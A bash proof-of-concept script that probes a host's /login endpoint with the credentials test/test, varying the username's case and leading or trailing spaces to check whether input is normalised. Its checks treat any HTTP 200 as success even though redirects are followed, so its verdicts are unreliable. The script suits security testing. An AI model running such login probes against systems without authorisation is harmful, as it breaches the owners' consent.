#!/bin/bash

# POC: Improper Username Input Normalization
# Demonstrates that login endpoint accepts usernames with:
# 1. Trailing whitespace
# 2. Case variations (uppercase, lowercase, mixed)
# Without proper normalization

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-80}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "=== Username Input Normalization Vulnerability POC ==="
echo "Target: $TARGET_URL"
echo ""

# Test 1: Normal username (baseline)
echo "[TEST 1] Normal username 'test'"
RESPONSE1=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/login" \
  -d "username=test&password=test" \
  -L 2>/dev/null)
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
echo "HTTP Status: $HTTP_CODE1"
if [ "$HTTP_CODE1" = "302" ] || [ "$HTTP_CODE1" = "200" ]; then
  echo "✓ PASS - Normal username accepted"
else
  echo "✗ FAIL - Normal username rejected"
fi
echo ""

# Test 2: Username with trailing space
echo "[TEST 2] Username with trailing space 'test '"
RESPONSE2=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/login" \
  -d "username=test%20&password=test" \
  -L 2>/dev/null)
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
echo "HTTP Status: $HTTP_CODE2"
if [ "$HTTP_CODE2" = "302" ] || [ "$HTTP_CODE2" = "200" ]; then
  echo "✓ PASS - Trailing space accepted (NOT NORMALIZED)"
else
  echo "✗ FAIL - Trailing space rejected"
fi
echo ""

# Test 3: Uppercase username
echo "[TEST 3] Uppercase username 'TEST'"
RESPONSE3=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/login" \
  -d "username=TEST&password=test" \
  -L 2>/dev/null)
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n1)
echo "HTTP Status: $HTTP_CODE3"
if [ "$HTTP_CODE3" = "302" ] || [ "$HTTP_CODE3" = "200" ]; then
  echo "✓ PASS - Uppercase accepted (NOT NORMALIZED)"
else
  echo "✗ FAIL - Uppercase rejected"
fi
echo ""

# Test 4: Mixed case username
echo "[TEST 4] Mixed case username 'TeSt'"
RESPONSE4=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/login" \
  -d "username=TeSt&password=test" \
  -L 2>/dev/null)
HTTP_CODE4=$(echo "$RESPONSE4" | tail -n1)
echo "HTTP Status: $HTTP_CODE4"
if [ "$HTTP_CODE4" = "302" ] || [ "$HTTP_CODE4" = "200" ]; then
  echo "✓ PASS - Mixed case accepted (NOT NORMALIZED)"
else
  echo "✗ FAIL - Mixed case rejected"
fi
echo ""

# Test 5: Username with leading space
echo "[TEST 5] Username with leading space ' test'"
RESPONSE5=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/login" \
  -d "username=%20test&password=test" \
  -L 2>/dev/null)
HTTP_CODE5=$(echo "$RESPONSE5" | tail -n1)
echo "HTTP Status: $HTTP_CODE5"
if [ "$HTTP_CODE5" = "302" ] || [ "$HTTP_CODE5" = "200" ]; then
  echo "✓ PASS - Leading space accepted (NOT NORMALIZED)"
else
  echo "✗ FAIL - Leading space rejected"
fi
echo ""

# Summary
echo "=== VULNERABILITY SUMMARY ==="
echo "If multiple tests show HTTP 302/200, the application accepts non-normalized usernames."
echo "This indicates improper input normalization on the login endpoint."